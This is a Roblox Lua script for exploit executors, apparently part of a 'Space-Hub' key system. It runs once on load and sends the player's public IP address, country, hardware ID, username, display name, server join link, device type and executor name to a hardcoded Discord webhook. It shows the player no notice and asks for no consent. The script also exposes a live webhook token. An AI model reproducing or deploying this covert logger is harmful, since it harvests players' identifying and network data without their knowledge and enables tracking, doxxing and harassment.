local WebhookURL = "https://discord.com/api/webhooks/1496115076229365882/-6XKgZFxTDB_2vNCmwcN0CJg8lgzfPs-YxRFaoMYUVAETfmbnjAeqqAEZIhPVNR787HK"

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function getExecutor()
    local success, result = pcall(function()
        if identifyexecutor then
            return identifyexecutor()
        elseif getexecutorname then
            return getexecutorname()
        end
    end)
    return success and result or "Unknown"
end

local function generateRandomId(length)
    local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    local randomId = ""
    for i = 1, length do
        local idx = math.random(1, #chars)
        randomId = randomId .. chars:sub(idx, idx)
    end
    return randomId
end

local idFile = "Space-Hub/Stats/Id.json"
local userId

local function loadUserId()
    if isfile and isfile(idFile) then
        local success, data = pcall(function()
            return HttpService:JSONDecode(readfile(idFile))
        end)
        if success and data and data.id and #tostring(data.id) == 32 then
            return tostring(data.id)
        end
    end

    local newId = generateRandomId(32)
    pcall(function()
        if writefile then
            writefile(idFile, HttpService:JSONEncode({ id = newId }))
        end
    end)
    return newId
end

userId = loadUserId()

local function getHttpRequest()
    local requestFunc = syn and syn.request or http and http.request or request or http_request
    if type(requestFunc) == "function" then
        return requestFunc
    end
    return nil
end

local function sendWebhook()
    local httpRequest = getHttpRequest()
    if not httpRequest then
        warn("No HTTP request method found")
        return false
    end

    local playerIp = "Unknown"
    local countryName = "Unknown"

    local ipSuccess, ipResult = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)

    if ipSuccess and ipResult then
        playerIp = ipResult
        local infoSuccess, infoResult = pcall(function()
            return game:HttpGet("http://ip-api.com/json/" .. playerIp)
        end)
        if infoSuccess and infoResult then
            local infoData = HttpService:JSONDecode(infoResult)
            if infoData and infoData.country then
                countryName = infoData.country
            end
        end
    end

    local osTime = os.time()
    local formattedTime = os.date("%H:%M:%S", osTime)

    local playerUserId = LocalPlayer.UserId
    local displayName = LocalPlayer.DisplayName
    local username = LocalPlayer.Name
    local playerProfileUrl = "https://www.roblox.com/users/" .. playerUserId .. "/profile"

    local serverId = game.JobId or "Unknown"
    local serverLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?serverId=" .. serverId

    local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"

    local hwid = "Unknown"
    pcall(function()
        if gethwid then
            hwid = gethwid()
        else
            hwid = "N/A"
        end
    end)

    local gameId = game.PlaceId
    local executor = getExecutor()

    local embedData = {
        title = "️ Script Execution Log",
        color = 0x00FF88,
        footer = { text = "ID: " .. userId },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", osTime),
        fields = {
            {
                name = " Player Information",
                value = string.format(
                    "[Profile](%s)\nUserId: `%s`\nDisplay: `%s`\nUsername: `%s`",
                    playerProfileUrl,
                    playerUserId,
                    displayName,
                    username
                ),
                inline = true
            },
            {
                name = " Server Details",
                value = string.format("[Join Server](%s)\nServer ID: `%s`", serverLink, serverId),
                inline = true
            },
            {
                name = " Game",
                value = string.format("PlaceId: `%s`", gameId),
                inline = true
            },
            {
                name = " Network",
                value = string.format("Country: `%s`\nIP: `%s`", countryName, playerIp),
                inline = true
            },
            {
                name = " Device",
                value = string.format("Type: `%s`\nExecutor: `%s`\nTime: `%s`", deviceType, executor, formattedTime),
                inline = true
            },
            {
                name = " Hardware",
                value = string.format("HWID: `%s`", hwid),
                inline = true
            }
        }
    }

    local postData = {
        username = "Key System",
        avatar_url = "https://avatars.mds.yandex.net/i?id=7411271ab034566f8577e68ca988ede20f43a694-7552332-images-thumbs&n=13",
        content = string.format("**Display Name:** %s\n**Username:** %s\n**HWID:** %s\n**ID:** %s", displayName, username, hwid, userId),
        embeds = { embedData }
    }

    local requestData = {
        Url = WebhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(postData)
    }

    local success, response = pcall(function()
        return httpRequest(requestData)
    end)

    if success and response then
        if response.StatusCode == 204 or response.StatusCode == 200 then
            print("Webhook sent successfully!")
            return true
        else
            warn("Webhook response status: " .. tostring(response.StatusCode))
            return false
        end
    else
        warn("Failed to send webhook: " .. tostring(response))
        return false
    end
end

sendWebhook()

